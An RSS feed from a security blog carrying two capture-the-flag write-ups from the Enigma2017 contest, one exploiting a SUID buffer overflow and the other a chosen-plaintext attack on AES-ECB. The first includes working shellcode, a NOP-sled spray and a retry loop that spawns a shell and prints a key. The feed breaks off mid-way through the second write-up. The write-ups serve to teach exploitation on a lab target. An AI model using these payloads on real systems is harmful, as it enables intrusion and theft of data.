<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on Mike&#39;s Blog</title>
    <link>https://michael-myers.github.io/blog/tags/ctf/index.xml</link>
    <description>Recent content in Ctf on Mike&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <atom:link href="https://michael-myers.github.io/blog/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Enigma2017 CTF Overflowme Writeup</title>
      <link>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</link>
      <pubDate>Sun, 12 Feb 2017 17:52:54 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</guid>
      <description>

&lt;p&gt;As mentioned in my last post, I spent some time solving security challenges posted on HackCenter for the Enigma2017 conference. This one (obviously) was to exploit a buffer overflow vulnerability. It was meant to be relatively easy, but sometimes you don&amp;rsquo;t realize the easiest approach first. I&amp;rsquo;ll walk through not just the solution, but the things I tried that &lt;em&gt;didn&amp;rsquo;t&lt;/em&gt; work. It was a refresher course in exploitation for me – I&amp;rsquo;ve spent many years on defense research and needed to brush up again. I know that this is a fast walkthrough, but I don&amp;rsquo;t want to try to teach every concept here, since it is a rather basic exercise, and many others have already explained them elsewhere. If you&amp;rsquo;re reading and would like clarification, feel free to hit me up on Twitter.&lt;/p&gt;

&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;They provided a web shell (literally a terminal emulator in your browser, at HackCenter.com) to a Linux host, and they even gave some free shellcode, &lt;code&gt;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&lt;/code&gt;. You can disassemble this several ways, but a fast and easy way is &lt;a href=&#34;https://alexaltea.github.io/capstone.js/&#34;&gt;someone else&amp;rsquo;s server running Capstone.js&lt;/a&gt;. We observe that it is an &lt;code&gt;execve&lt;/code&gt; syscall at the end, and apparently is running &lt;code&gt;/bin/sh&lt;/code&gt; to provide a shell. We already &lt;em&gt;have&lt;/em&gt; a shell, so there must be something different about this target process they want us to exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;    31 C0   xor eax, eax                # eax = NULL
    F7 E9   imul ecx
    50      push eax                    # the NULL that terminates the string
    68 2F 2F 73 68  push 0x68732f2f     # not a pointer! The string: “h//sh”
    68 2F 62 69 6E  push 0x6e69622f     # not a pointer! The string: “h/bin”
    89 E3   mov ebx, esp
    50      push eax                    # the NULL that terminates the string
    68 2D 69 69 69  push 0x6969692d     # the string “h-iii”
    89 E6   mov esi, esp
    50      push eax                    # arguments
    56      push esi                    #	  to
    53      push ebx                    #		execve()
    89 E1   mov ecx, esp
    B0 0B   mov al, 0xb                 # the code number for execve()
    CD 80   int 0x80                    # syscall()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s take a look at the shell we are given:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ uname -a
Linux enigma2017 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
$ pwd
/problems/9ae8cc98f274aa6de77715eb9bdea7ed
$ ls -la
total 24                     
drwxr-xr-x  2 root       root         4096 Jan 27 16:07 .
drwxr-x--x 89 root       root         4096 Jan 27 16:07 ..
-r--r-----  1 hacksports overflowme_0   33 Jan 31 18:57 key
-rwxr-sr-x  1 hacksports overflowme_0 6088 Jan 31 18:57 overflowme
-rw-rw-r--  1 hacksports hacksports    530 Jan 31 18:57 overflowme.c
$ id
uid=1883(myname) gid=1884(myname) groups=1884(myname),1001(competitors)
$ checksec --file overflowme
# ...weirdly, checksec never returns, a bug in HackCenter maybe...
$ cat /proc/sys/kernel/randomize_va_space
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the permissions for the &lt;code&gt;overlowme&lt;/code&gt; binary include the &lt;a href=&#34;https://en.wikipedia.org/wiki/Setuid&#34;&gt;SUID access right flag&lt;/a&gt;. When you run this binary, it runs as the user &lt;code&gt;hacksports&lt;/code&gt;, who is the owner of &lt;code&gt;key&lt;/code&gt; and can read it. The goal here is to run arbitrary code in this process and use it to read &lt;code&gt;key&lt;/code&gt;. The given shellcode, executed by &lt;code&gt;overflowme&lt;/code&gt;, would provide us a shell where we have the ability to read &lt;code&gt;key&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Notice also the last command, which reads out the ASLR setting: 2. That means that we should expect the OS to randomize the layout of the program&amp;rsquo;s memory when it runs (both text &lt;em&gt;and&lt;/em&gt; data segments, is what 2 means).&lt;/p&gt;

&lt;p&gt;What about the source code they&amp;rsquo;re letting us see?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;quot;inspection.h&amp;quot;

void vuln(char *str) {
    char buf[979];
    sprintf(buf, &amp;quot;Hello %s&amp;quot;, str);
    puts(buf);
    fflush(stdout);
    return;
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf(&amp;quot;Usage: %s [name]\n&amp;quot;, argv[0]);
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-vulnerability&#34;&gt;The Vulnerability&lt;/h2&gt;

&lt;p&gt;This is a stack-based buffer overflow in the sprintf() call. A fixed-length buffer, &lt;code&gt;buf[979]&lt;/code&gt; takes a user input of unchecked (and unlimited) length, in the program&amp;rsquo;s first command-line argument. Since &lt;code&gt;buf&lt;/code&gt; is on the stack (as it is a local variable to the function &lt;code&gt;vuln&lt;/code&gt;), this is a stack-based buffer overflow.&lt;/p&gt;

&lt;p&gt;There are many, many guides out there that explain what happens when you overflow a stack-based buffer on a program that was compiled with absolutely no exploit mitigations: your input overwrites the saved return pointer (also on the stack), and the function epilogue&amp;rsquo;s &lt;code&gt;RET&lt;/code&gt; instruction transfers code execution to the address that is now part of the overflowed input. So, the attacker decides where execution will go: arbitrary code execution.&lt;/p&gt;

&lt;p&gt;Proof of the vulnerability:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `perl -e &#39;print &amp;quot;\x30&amp;quot;x982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or if you prefer Python:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `python -c &#39;print &amp;quot;\x30&amp;quot;*982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-exploitation&#34;&gt;The Exploitation&lt;/h2&gt;

&lt;p&gt;Successful exploitation in a real-world scenario would require multiple prerequisite steps, but this is a simplified exploitaiton case. We just need to solve a few things.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Determine the offset in the attack input at which it overwrites the stored return pointer. These bytes have to point to where execution should go.&lt;/li&gt;
&lt;li&gt;In order to complete step 1, determine the address where execution should go.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let&amp;rsquo;s start with the 2nd thing. Check the process memory map by launching it under GDB and using ProcFS:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) start
(gdb) shell ps
# ... observe the PID of overflowme, it is 32687
(gdb) shell cat /proc/32687/maps
08048000-08049000 r-xp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
08049000-0804a000 rwxp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f7570000-f7571000 rwxp 00000000 00:00 0
f7571000-f7718000 r-xp 00000000 ca:02 786437      /lib32/libc-2.19.so
f7718000-f771a000 r-xp 001a7000 ca:02 786437      /lib32/libc-2.19.so
f771a000-f771b000 rwxp 001a9000 ca:02 786437      /lib32/libc-2.19.so
f771b000-f771f000 rwxp 00000000 00:00 0
f772a000-f772b000 rwxp 00000000 00:00 0
f772b000-f772c000 r-xp 00000000 00:00 0           [vdso]
f772c000-f772e000 r--p 00000000 00:00 0           [vvar]
f772e000-f774e000 r-xp 00000000 ca:02 786434      /lib32/ld-2.19.so
f774e000-f774f000 r-xp 0001f000 ca:02 786434      /lib32/ld-2.19.so
f774f000-f7750000 rwxp 00020000 ca:02 786434      /lib32/ld-2.19.so
fff84000-fffa5000 rwxp 00000000 00:00 0           [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last memory range, &lt;code&gt;[stack]&lt;/code&gt; is executable. You would not see this anymore these days, but this makes exploitation easier, it means shellcode in the buffer overflow input itself can run where it exists, directly. So we just need to check where the buffer is on the stack and put the address into the buffer and we&amp;rsquo;re good to go?&lt;/p&gt;

&lt;p&gt;Well hold on. Recall that we saw ASLR was enabled in the OS. Let&amp;rsquo;s run it another time and see these maps again.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;08048000-08049000 r-xp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme           
08049000-0804a000 rwxp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f75fd000-f75fe000 rwxp 00000000 00:00 0
f75fe000-f77a5000 r-xp 00000000 ca:02 786437    /lib32/libc-2.19.so
f77a5000-f77a7000 r-xp 001a7000 ca:02 786437    /lib32/libc-2.19.so    
f77a7000-f77a8000 rwxp 001a9000 ca:02 786437    /lib32/libc-2.19.so
f77a8000-f77ac000 rwxp 00000000 00:00 0
f77b7000-f77b8000 rwxp 00000000 00:00 0
f77b8000-f77b9000 r-xp 00000000 00:00 0         [vdso]
f77b9000-f77bb000 r--p 00000000 00:00 0         [vvar]
f77bb000-f77db000 r-xp 00000000 ca:02 786434    /lib32/ld-2.19.so
f77db000-f77dc000 r-xp 0001f000 ca:02 786434    /lib32/ld-2.19.so
f77dc000-f77dd000 rwxp 00020000 ca:02 786434    /lib32/ld-2.19.so
ffb9d000-ffbbe000 rwxp 00000000 00:00 0         [stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See that the stack is at a different address. The OS has applied ASLR to the data segments and the shared libraries for &lt;code&gt;libc&lt;/code&gt; and &lt;code&gt;ld&lt;/code&gt;. However, the entirety of the program binary itself has not moved. That is, apparently &lt;code&gt;overflowme&lt;/code&gt; was not even compiled with support for ASLR. Cool!&lt;/p&gt;

&lt;p&gt;Our shellcode is on the stack though, and the stack is one of the parts of memory that is moving around on every run. But that&amp;rsquo;s what we need a pointer to! Our only hope, then, is to find an instruction somewhere in the static mappings that jumps execution back to the stack. &lt;em&gt;Note: here is where I tried a number of unnecessary and fruitless solutions, thinking about this like a modern exploit developer (ROP gadgets, trampolines, etc.). If you just want to read the solution, skip to the next section where I &amp;ldquo;Phone a Friend.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;My goal was to find an &amp;ldquo;instruction gadget&amp;rdquo; within the static mapping that would effectively work as a &lt;code&gt;JMP ESP&lt;/code&gt; or &lt;code&gt;CALL ESP&lt;/code&gt;. Using &lt;code&gt;hexdump -C | grep FF&lt;/code&gt; I looked for &lt;code&gt;FF E4&lt;/code&gt; or &lt;code&gt;FF D4&lt;/code&gt; sequences. This is an extremely crude way to do this, but keep in mind the binary is very small. Unfortunately, &lt;em&gt;because&lt;/em&gt; it&amp;rsquo;s so small, there was also no occurence of either byte sequence.&lt;/p&gt;

&lt;p&gt;If any of the general-purpose registers at the time of the function return happen to also hold pointers to the stack range, then we could trampoline through a &lt;code&gt;JMP EAX/EBX/ECX/EDX&lt;/code&gt; or &lt;code&gt;CALL EAX/EBX/ECX/EDX&lt;/code&gt;, etc. So I also looked for any of these sequences. I found an &lt;code&gt;FF D0 (call EAX)&lt;/code&gt;, and a &lt;code&gt;FF D2 (call EDX)&lt;/code&gt;! Good, but do we control either of those registers? Check: &lt;code&gt;(gdb) info registers&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eax            0x0      0                         
ebx            0xffa5d5a0       -5909088
ecx            0xf7726878       -143497096
edx            0x0      0
…
esp            0xffa5d56c       0xffa5d56c
ebp            0xffa5d588       0xffa5d588 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;annnnd no, they’re both 0x0 by the time the attacker gets control of &lt;code&gt;EIP&lt;/code&gt;. But what&amp;rsquo;s this, &lt;code&gt;EBX&lt;/code&gt; points into the stack (verified by another look at the &lt;code&gt;/proc/PID/maps&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ffa3e000-ffa5f000 rwxp 00000000 00:00 0		[stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But alas, poring over the hexdump of the static mappings in memory, there is no &lt;code&gt;CALL EBX (FF D3)&lt;/code&gt; or &lt;code&gt;JMP EBX (FF E3)&lt;/code&gt; gadgets! There&amp;rsquo;s not even something more indirect, like a &lt;code&gt;PUSH EBX; RET (53 C3&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Another idea was to try to jump to one of the &lt;code&gt;GOT&lt;/code&gt; entries, but this is a tiny little toy binary! It doesn&amp;rsquo;t import anything useful, as we see with &lt;code&gt;objdump -T&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;DYNAMIC SYMBOL TABLE:                                                          
00000000      DF *UND*  00000000  GLIBC_2.0   printf                           
00000000      DF *UND*  00000000  GLIBC_2.0   fflush                           
00000000      DF *UND*  00000000  GLIBC_2.0   getegid                          
00000000      DF *UND*  00000000  GLIBC_2.0   puts                             
00000000  w   D  *UND*  00000000              __gmon_start__                   
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main                
00000000      DF *UND*  00000000  GLIBC_2.0   sprintf                          
00000000      DF *UND*  00000000  GLIBC_2.0   setresgid                        
08049a40 g    DO .bss   00000004  GLIBC_2.0   stdout                           
0804872c g    DO .rodata        00000004  Base        _IO_stdin_used 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If there was a &lt;code&gt;system()&lt;/code&gt; in here or something it would be a different story maybe, but as is, there are no useful standard library calls in this table.&lt;/p&gt;

&lt;p&gt;The ROP approach to this has failed me.&lt;/p&gt;

&lt;h2 id=&#34;phoning-a-friend&#34;&gt;Phoning a Friend&lt;/h2&gt;

&lt;p&gt;At this point I called a smart friend of mine for a tip on how to jump the instruction pointer to this stupid shellcode on the stack. We discussed more advanced gadget-finding using Z3 solvers and all sorts of stuff, but ultimately the hints that stuck with me were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Duh, you can stack spray like it&amp;rsquo;s 1992: just make your input 100KB, NOP-sled to the end where shellcode lies, and re-run the exploit until it works by chance (until the input happens to inhabit a range around the address we choose to put in the overflowed return pointer).&lt;/li&gt;
&lt;li&gt;You can store an arbitrary amount of NOP-sled in an environment variable and it will all get located in the stack segment.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;making-it-work&#34;&gt;Making It Work&lt;/h2&gt;

&lt;p&gt;Okay, so I have a good idea of how to (messily and probabilistically) get a successful exploit. The only thing I skipped over earlier was determining exactly how many bytes offset into the attack input we need to place the pointer. The way you do this is to use an exploit pattern string, such as you can &lt;a href=&#34;http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/&#34;&gt;generate online here&lt;/a&gt; or offline using &lt;a href=&#34;https://github.com/Svenito/exploit-pattern/blob/master/pattern.py&#34;&gt;various tools&lt;/a&gt;, and then watch the value of &lt;code&gt;EIP&lt;/code&gt; when the process crashes under GDB:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that the bytes from the pattern that fill EIP (little endian, remember) are &amp;quot;g8Bg&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I chose a pointer that was in the middlish-range for the stack: 0xff881111, converted it into little-endian order, and put it into the attack string at the same location. We can confirm:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;)
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that EIP is 0xff881111. Maybe it doesn&#39;t point into the stack on THIS run but it sometimes will, which is all we need, since we&#39;re allowed to retry the attack until it does.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Putting it all together:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Store a NOP sled of 0x90 bytes and the shellcode at the end, in the stack via an env. var.:
$ export SHELLCODE=$(python -c &#39;print &amp;quot;\x90&amp;quot;*100000 + &amp;quot;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&amp;quot;&#39;)

# Point to the stack, and keep running the attack until it works: the ol&#39; &amp;quot;spray &amp;amp; pray&amp;quot;
$ for i in {1..100}; do ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;); done

# Boom, it pops a shell:
$ ls
key  overflowme  overflowme.c                                                  
$ cat key
bb379544581fa2b010d958d6e78addfa
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Enigma2017 CTF Broken Encryption Writeup</title>
      <link>https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/</link>
      <pubDate>Sun, 12 Feb 2017 13:40:38 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/</guid>
      <description>

&lt;p&gt;There is a new &amp;ldquo;Jeopardy style&amp;rdquo; security CTF web framework (CTF-as-a-Service?) called &lt;a href=&#34;http://hackcenter.com/&#34;&gt;HackCenter&lt;/a&gt; that just debuted from For All Secure, the CMU-affiliated security startup known for &lt;a href=&#34;https://www.defense.gov/News/Article/Article/906931/three-teams-earn-prizes-in-darpa-cyber-grand-challenge&#34;&gt;winning last year&amp;rsquo;s DARPA Cyber Grand Challenge Final Event&lt;/a&gt; with their game-playing &amp;ldquo;automated exploit generation&amp;rdquo; system they called Mayhem CRS. HackCenter is their &amp;ldquo;other&amp;rdquo; technology, I guess, and right now the only CTF they&amp;rsquo;ve hosted is/was the one that occurred at &lt;a href=&#34;https://www.usenix.org/conference/enigma2017&#34;&gt;Enigma2017 USENIX&lt;/a&gt; conference at the end of January. It seemed to be marketed as educational: &amp;ldquo;learn to hack!&amp;rdquo; and not as unfriendly and elitist as some of the more competitive CTFs, so I gave it a look. Also, this was a chance to refresh myself on some Python.&lt;/p&gt;

&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;They give us a telnet server that prompts us to send whatever string we want, and then it sends back an encrypted version of that string. Also they give us this source code for the server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python -u
from Crypto.Cipher import AES

flag = open(&amp;quot;flag&amp;quot;, &amp;quot;r&amp;quot;).read().strip()
key = open(&#39;enc_key&#39;, &#39;r&#39;).read().strip().decode(&#39;hex&#39;)

welcome = &amp;quot;&amp;quot;&amp;quot;
************ MI6 Secure Encryption Service ************
                  [We&#39;re super secure]
       ________   ________    _________  ____________;_
      - ______ \ - ______ \ / _____   //.  .  ._______/ 
     / /     / // /     / //_/     / // ___   /
    / /     / // /     / /       .-&#39;//_/|_/,-&#39;
   / /     / // /     / /     .-&#39;.-&#39;
  / /     / // /     / /     / /
 / /     / // /     / /     / /
/ /_____/ // /_____/ /     / /
\________- \________-     /_/

&amp;quot;&amp;quot;&amp;quot;

def pad(m):
  m = m + &#39;1&#39;
  while len(m) % 16 != 0:
    m = m + &#39;0&#39;
  return m

def encrypt():
  cipher = AES.new(key,AES.MODE_ECB)

  m = raw_input(&amp;quot;Agent number: &amp;quot;)
  m = &amp;quot;agent &amp;quot; + m + &amp;quot; wants to see &amp;quot; + flag

  return cipher.encrypt(pad(m)).encode(&amp;quot;hex&amp;quot;)

print welcome
print encrypt()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We also get a web shell on hackcenter.com: literally an in-browser terminal emulator connected to the remote server (we do not have read access to the directory with &amp;ldquo;flag&amp;rdquo;), but for this problem we will just open our local Terminal app and poke around.&lt;/p&gt;

&lt;h2 id=&#34;anything-ecb-is-bad-mmmkay&#34;&gt;Anything ECB is Bad Mmmkay&lt;/h2&gt;

&lt;p&gt;Look at the source: basically, &lt;code&gt;&amp;quot;agent &amp;quot; + yourinput + &amp;quot; wants to see &amp;quot; + flag&lt;/code&gt; is padded out to the next nearest AES block length (128 bits == 16 bytes) and then encrypted with AES-ECB using whatever the key is. Now, basically the first thing you learn about block ciphers is to never use the Electronic Code Book (ECB) mode. You&amp;rsquo;ll see a photo of Tux the Linux mascot encrypted with AES-ECB and how you can still see the edges of the image in the encrypted version. But that&amp;rsquo;s about it. It&amp;rsquo;s rare to see an explanation of why this is relevant or how to break it. Just, &amp;ldquo;everyone knows it&amp;rsquo;s bad.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;The reason why ECB mode of any block cipher is bad is that the same input always encrypts to the same output. The input is broken into fixed-length blocks and encrypted, and all of the blocks of identical input will create similarly equal output blocks. The data is all encrypted, but we know where their plaintexts were the same. There is &lt;em&gt;no key recovery attack against this issue&lt;/em&gt;, at least not that I am aware of, but the problem is that the plaintext can be guessed. There are two basic attacks against ECB:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Given enough encrypted blocks and some partial knowledge of the plaintext (known offsets of fixed data, like as defined by filetype formats or communication protocols), statistical and frequency analysis (and some guessing, then confirming) can reveal partial plaintext.&lt;/li&gt;
&lt;li&gt;Given the ability to prefix or circumfix (that means insert in the middle somewhere) arbitrary plaintext, and then have it encrypted and view the resulting ciphertext, an attacker can stage what cryptographers call a Chosen Plaintext Attack (CPA). The scenario of passing arbitrary plaintext to a remote encryptor and receiving the ciphertext back is also called an &lt;a href=&#34;https://en.wikipedia.org/wiki/Oracle_machine#Applications_to_cryptography&#34;&gt;Oracle&lt;/a&gt;. This is the attack we will discuss in this post.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The reason why this is &lt;em&gt;relevant&lt;/em&gt; is that to the average programmer who can&amp;rsquo;t be bothered, ECB looks like a valid mode choice for AES, a cipher that people generally recommend: &amp;ldquo;military grade crypto,&amp;rdquo; right? They might use it to encrypt the cookie their web site stores in your browser. Or if they&amp;rsquo;re especially ignorant in security like the people who work at Adobe, &lt;a href=&#34;https://arstechnica.com/security/2013/11/how-an-epic-blunder-by-adobe-could-strengthen-hand-of-password-crackers/&#34;&gt;they might use it to encrypt their users&amp;rsquo; passwords on the server&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;breaking-ecb-with-the-chosen-plaintext-attack&#34;&gt;Breaking ECB with the Chosen Plaintext Attack&lt;/h2&gt;

&lt;p&gt;Being able to circumfix our arbitrary input into the plaintext (at a known location in that string) means that we can choose an input such that we can fully align &lt;em&gt;our&lt;/em&gt; &lt;em&gt;known&lt;/em&gt; &lt;em&gt;substring&lt;/em&gt; on an AES block boundary. Thus allowing us to test what the ciphertext is for any arbitrary block that we choose.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot;agent &amp;quot; + yourinput + &amp;quot; wants to see &amp;quot; + flag + padding
(6 chars)  (n chars)    (14 chars)   &amp;lt;—- if you want to test-encrypt a single block of arbitrary input, put your test input on a 16-byte block boundary, like so: yourinput = &amp;quot;01234567891000000000000000&amp;quot;. &amp;quot;1000000000000000&amp;quot; is at bytes 16 through 31 of the input, aka the second AES (128-bit, 16-byte) block.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We don&amp;rsquo;t know how long the flag is, but we know how the padding is applied: if the plaintext message does not end on a 16-byte boundary, then it is extended by a single &amp;ldquo;1&amp;rdquo; and up to 14 &amp;ldquo;0&amp;rdquo; characters. If the plaintext message &lt;em&gt;does&lt;/em&gt; end on a 16-byte boundary, then it is extended by a full block of padding: &lt;code&gt;1000000000000000&lt;/code&gt;. This may seem counter-intuitive, but there always has to be padding in a block cipher, even when the message length already is a multiple of the block length: otherwise how would you know if the last block is padding or if &lt;code&gt;1000000000000000&lt;/code&gt; was part of the message?&lt;/p&gt;

&lt;p&gt;See where we&amp;rsquo;re going with this? We will give the above plaintext, and observe the output&amp;rsquo;s 2nd block. That is the exact same output we would expect to see as the last block of ciphertext if the flag ends at a block boundary and the final block were AES padding.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Agent number: 01234567891000000000000000
ceaa6fa24a71971f21413c1ea39f4e7c53b1c1d36d11a2c20dfc3913bb299f11c9777890922460e74fefb1a94f5c95df0ebb6d7bc5a7922f0857283feb2b068dc5148be36b7670e2ca4fe52c3f65c37612b88acbe4bbd5a9f2588bbc4e0ea92453b1c1d36d11a2c20dfc3913bb299f11
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note the second block (32 hex characters = 16 bytes) of ciphertext is &lt;code&gt;53b1c1d36d11a2c20dfc3913bb299f11c&lt;/code&gt; and, through a stroke of luck, we&amp;rsquo;ve already aligned the overall message on a block boundary too, as we see &lt;code&gt;53b1c1d36d11a2c20dfc3913bb299f11c&lt;/code&gt; is also the last block of ciphertext!&lt;/p&gt;

&lt;p&gt;The game now is to insert one &lt;em&gt;additional&lt;/em&gt; byte of arbitray text in order to push a single byte of the &amp;ldquo;flag&amp;rdquo; portion of the string rightward into the padding block. The final padding block will be &lt;code&gt;n100000000000000&lt;/code&gt; where &lt;code&gt;n&lt;/code&gt; is the unknown byte of flag.&lt;/p&gt;

&lt;p&gt;What will we do then to guess that byte? We&amp;rsquo;ll brute-force it: send new plaintext messages for all 255 possibilities of &lt;code&gt;n&lt;/code&gt; in our block-aligned arbitrary input (which is the 2nd block). When the ciphertext&amp;rsquo;s 2nd block matches the ciphertext&amp;rsquo;s 7th block, then we know we guessed correctly. Then we&amp;rsquo;ll insert one additional byte again at the same location, and repeat this process. In other words, we expect to send a series of messages like the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0123456789a100000000000000
0123456789b100000000000000
0123456789c100000000000000
0123456789d100000000000000
0123456789e100000000000000 ... let&#39;s say that ciphertext blocks 2 and 7 match at this point!
0123456789ae10000000000000
0123456789be10000000000000
0123456789ce10000000000000
0123456789de10000000000000
0123456789ee10000000000000
0123456789fe10000000000000 ... they match again. We so far know last block = fe10000000000000
0123456789afe1000000000000
0123456789bfe1000000000000
